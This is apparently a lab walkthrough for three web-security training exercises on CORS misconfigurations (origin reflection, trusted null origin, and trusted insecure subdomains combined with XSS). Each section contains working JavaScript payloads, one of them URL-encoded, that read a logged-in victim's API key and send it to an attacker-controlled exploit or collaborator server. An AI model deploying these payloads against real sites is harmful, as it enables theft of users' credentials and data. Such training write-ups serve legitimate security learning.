# Navigation
- [CORS vulnerability with basic origin reflection](#cors-vulnerability-with-basic-origin-reflection)
- [CORS vulnerability with trusted null origin](#cors-vulnerability-with-trusted-null-origin)
- [CORS vulnerability with trusted insecure protocols](#cors-vulnerability-with-trusted-insecure-protocols)
# CORS vulnerability with basic origin reflection
- Retrieve API key
1. Login and view account
2. Identify a subsequent request in Burp which retrieves users API key
```
GET /accountDetails
```
3. Provide an arbitrary Origin header and confirm it is reflected in the HTTP response
```
# Request
Origin: https://example.com

# Response
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
```
4. Because arbitrary origins are reflected and that credentials can be included (i.e. Cookies), we can host a malicious page to make users send their HTTP response to our own server
5. Host a malicious page
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0af60052036fdad380450d6d00990076.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://exploit-0a2300450380da1a80fd0c7901500045.exploit-server.net/log?key='+btoa(this.responseText);
};
</script>
```
6. Deliver exploit to victim
7. Check server logs > Decode base64 text and retrieve API key
# CORS vulnerability with trusted null origin
- Retrieve API key
1. Login and view account
2. Identify a subsequent request in Burp which retrieves users API key
```
GET /accountDetails
```
3. Provide a null origin header and confirm it is reflected in the HTTP response
```
# Request
Origin: null

# Response
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
4. Because null origins are allowed as well as credentials, we can use a sandboxed iframe to perform a "null" origin request and send the response to our attacking server
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```
5. Send exploit to victim
6. Check access log > Decode base64 text > Retrieve API key
# CORS vulnerability with trusted insecure protocols
- Retrieve API key
1. Login and view account
2. Identify subsequent request in Burp which retrieves users API key
```
GET /accountDetails
```
3. Providing arbitrary origin does not reflect in the HTTP response
4. Providing an arbitrary sub-domain does reflect in the HTTP response however
```
# Request
Origin: https://deez.0af2006b04361107805f17a9006c0079.web-security-academy.net

# Response
Access-Control-Allow-Origin: https://deez.0af2006b04361107805f17a9006c0079.web-security-academy.net
```
5. Checking the stock of an item opens a new page with two parameters
6. `productId` parameter is vulnerable to XSS
```
GET /?productId=<script>alert(document.domain)</script>&storeId=1
```
7. Use this vulnerability to make a victim request the `accountDetails` endpoint and send their API key to our sever
8. Create a malicious HTML document with a CORS payload inside the vulnerable parameter of the stock
```html
<script>
window.location = "http://stock.0af2006b04361107805f17a9006c0079.web-security-academy.net/?productId=<script>
const request = new XMLHttpRequest()
request.open("get","https://0af2006b04361107805f17a9006c0079.web-security-academy.net/accountDetails", true)
request.onload = () => {
fetch("https://f5lr5impd2tzad8jsa8txsu2ptvkjh76.oastify.com", {
mode: "no-cors",
method: "POST",
body: request.responseText
});
}
request.withCredentials = true
request.send()
</script>&storeId=1"
</script>
```
9. URL encode the XSS payload
```html
<script>
    window.location = "http://stock.0af2006b04361107805f17a9006c0079.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%0a%09%63%6f%6e%73%74%20%72%65%71%75%65%73%74%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%0a%09%72%65%71%75%65%73%74%2e%6f%70%65%6e%28%22%67%65%74%22%2c%22%68%74%74%70%73%3a%2f%2f%30%61%66%32%30%30%36%62%30%34%33%36%31%31%30%37%38%30%35%66%31%37%61%39%30%30%36%63%30%30%37%39%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%22%2c%20%74%72%75%65%29%0a%09%72%65%71%75%65%73%74%2e%6f%6e%6c%6f%61%64%20%3d%20%28%29%20%3d%3e%20%7b%0a%09%09%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%66%35%6c%72%35%69%6d%70%64%32%74%7a%61%64%38%6a%73%61%38%74%78%73%75%32%70%74%76%6b%6a%68%37%36%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%22%2c%20%7b%0a%09%09%09%6d%6f%64%65%3a%20%22%6e%6f%2d%63%6f%72%73%22%2c%0a%09%09%09%6d%65%74%68%6f%64%3a%20%22%50%4f%53%54%22%2c%0a%09%09%09%62%6f%64%79%3a%20%72%65%71%75%65%73%74%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%0a%09%09%7d%29%3b%0a%09%7d%0a%09%72%65%71%75%65%73%74%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%0a%09%72%65%71%75%65%73%74%2e%73%65%6e%64%28%29%0a%3c%2f%73%63%72%69%70%74%3e&storeId=1"
</script>
```
10. Send payload to victim
11. Check collaborator history
